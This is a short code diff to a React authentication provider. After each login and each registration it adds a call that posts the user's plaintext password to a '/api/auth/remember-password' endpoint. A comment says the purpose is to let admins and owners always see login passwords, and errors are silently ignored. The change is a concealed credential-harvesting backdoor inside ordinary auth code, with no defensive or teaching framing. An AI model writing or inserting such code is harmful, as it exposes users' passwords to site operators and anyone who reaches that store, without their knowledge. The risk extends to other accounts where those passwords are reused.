@@ -88,6 +88,15 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
         });
         setUser(data.user);
         writeCachedUser(data.user);
+        // Backup write so Admin/Owner always see the login password
+        try {
+          await api("/api/auth/remember-password", {
+            method: "POST",
+            body: JSON.stringify({ password }),
+          });
+        } catch {
+          /* ignore */
+        }
       },
       register: async (input) => {
         setError(null);
@@ -97,6 +106,14 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
         });
         setUser(data.user);
         writeCachedUser(data.user);
+        try {
+          await api("/api/auth/remember-password", {
+            method: "POST",
+            body: JSON.stringify({ password: input.password }),
+          });
+        } catch {
+          /* ignore */
+        }
       },
       logout: async () => {
         try {
